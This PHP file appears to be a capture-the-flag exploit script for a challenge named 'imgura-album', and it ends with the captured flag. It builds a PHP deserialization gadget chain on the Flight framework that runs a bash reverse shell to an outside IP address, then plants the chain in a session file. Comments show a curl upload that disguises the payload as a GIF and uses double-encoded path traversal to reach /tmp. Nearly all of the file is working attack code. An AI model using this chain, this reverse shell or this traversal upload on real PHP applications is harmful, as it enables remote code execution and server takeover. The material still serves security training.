<?php

// need to run `composer install` in `src` folder
include 'src/vendor/autoload.php';
include 'src/lib/class.album.php';
include 'src/lib/class.user.php';

use flight\Engine;

function forceGet($obj, $prop)
{
    $reflection = new ReflectionClass($obj);
    $property = $reflection->getProperty($prop);
    $property->setAccessible(true);
    return $property->getValue($obj);
}

function forceSet($obj, $prop, $val)
{
    $reflection = new ReflectionClass($obj);
    $property = $reflection->getProperty($prop);
    $property->setAccessible(true);
    $property->setValue($obj, $val);
}

session_start();

# reverse shell
$ip = '48.76.3.3';
$port = '8763';

$e = new Engine();
forceSet(forceGet($e, 'dispatcher'), 'events', []);
forceSet(forceGet($e, 'dispatcher'), 'filters', []);
forceSet(forceGet($e, 'loader'), 'classes', ['getUsername' => ['system', ["bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"], 'unused_callback']]);
forceSet(forceGet($e, 'loader'), 'instances', []);
forceSet(forceGet($e, 'loader'), 'dirs', []);
$e = unserialize(serialize(($e)));
// $e->getUsername();

$_SESSION['GIF'] = 48763;
$_SESSION['user'] = $e;
echo session_encode();

# php payload_gen > test.gif
# curl -H 'Cookie: PHPSESSID=pekomikojpg' 'https://imgura-album.h4ck3r.quest/album/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252ftmp/add' -X POST -F 'image=@test.gif; filename="sess_pekomikojpg"'

# FLAG{4lbums_pwn3ddd}
